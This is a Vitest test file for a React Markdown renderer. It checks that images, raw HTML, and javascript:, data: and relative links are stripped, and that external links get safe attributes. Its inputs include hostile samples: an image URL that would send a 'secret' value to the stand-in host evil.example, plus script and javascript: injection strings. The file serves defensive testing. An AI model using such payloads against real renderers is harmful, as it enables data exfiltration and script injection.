import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "./markdown";

const render = (md: string) => renderToStaticMarkup(<Markdown>{md}</Markdown>);

describe("Markdown", () => {
  it("never renders images, so no remote request can be triggered", () => {
    const html = render("before ![x](https://evil.example/t.png?q=secret) after\n\n![y](data:image/png;base64,AAAA)");
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toContain("evil.example");
  });

  it("renders http(s) links with noopener noreferrer in a new tab", () => {
    const html = render("[site](https://nsap.nic.in/) and [plain](http://example.org)");
    expect(html).toContain('href="https://nsap.nic.in/"');
    expect(html).toContain('href="http://example.org/"');
    expect(html.match(/rel="noopener noreferrer"/g)).toHaveLength(2);
    expect(html.match(/target="_blank"/g)).toHaveLength(2);
  });

  it("drops javascript:, data:, mailto: and relative hrefs but keeps the text", () => {
    const html = render("[a](javascript:alert(1)) [b](data:text/html,x) [c](mailto:x@y.z) [d](/relative)");
    expect(html).not.toContain("href");
    for (const t of ["a", "b", "c", "d"]) expect(html).toContain(`<span>${t}</span>`);
  });

  it("does not render raw HTML", () => {
    const html = render('<img src="https://evil.example/x.png"> <script>alert(1)</script>');
    expect(html).not.toMatch(/<img|<script/i);
  });
});
